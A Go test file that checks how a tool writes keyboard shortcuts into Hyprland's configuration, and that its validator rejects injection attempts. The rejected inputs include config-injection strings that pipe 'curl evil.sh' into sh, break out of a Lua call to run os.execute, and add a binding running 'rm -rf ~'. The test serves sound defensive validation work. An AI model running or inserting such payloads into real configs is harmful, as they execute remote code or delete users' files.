package main

import (
	"strings"
	"testing"
)

func TestHyprLine(t *testing.T) {
	lua := hyprLine("Alt+Space", true)
	if !strings.HasPrefix(lua, `o.bind("ALT + SPACE", "Blup Studio", "'`) || !strings.HasSuffix(lua, `' --toggle") -- Blup Studio`) {
		t.Fatalf("lua: %s", lua)
	}
	conf := hyprLine("Ctrl+Shift+`", false)
	if !strings.HasPrefix(conf, "bindd = CTRL SHIFT, GRAVE, Blup Studio, exec, '") || !strings.HasSuffix(conf, "' --toggle # Blup Studio") {
		t.Fatalf("conf: %s", conf)
	}
	text := "a\n" + lua + "\nb\n"
	if got := blupLine.ReplaceAllString(text, ""); got != "a\nb\n" {
		t.Fatalf("remove: %q", got)
	}
}

// A shortcut from the window goes into Hyprland's config: only key names
// pass, never quotes, backslashes or line breaks that would add code.
func TestValidAccel(t *testing.T) {
	for _, ok := range []string{"Alt+Space", "Ctrl+Shift+`", "Super+K", "F5", "Ctrl+Alt+Ç", "Ctrl+.", "Ctrl+Shift+Up"} {
		if !validAccel(ok) {
			t.Errorf("%q refused", ok)
		}
	}
	for _, bad := range []string{
		"",
		"Alt+Space\nexec-once = curl evil.sh | sh",
		`Alt+X", "x", "sh -c 'curl evil|sh'") os.execute("id") --`,
		"Alt+\\",
		"Alt+'",
		"Alt+,",
		"Alt+#",
		"Ctrl++",
		"Alt+Space # Blup Studio\nbind = , A, exec, rm -rf ~",
		strings.Repeat("A", 65),
	} {
		if validAccel(bad) {
			t.Errorf("%q accepted", bad)
		}
	}
	if err := writeBinding("Alt+X\nexec-once = id"); err == nil {
		t.Error("writeBinding wrote an invalid shortcut")
	}
}
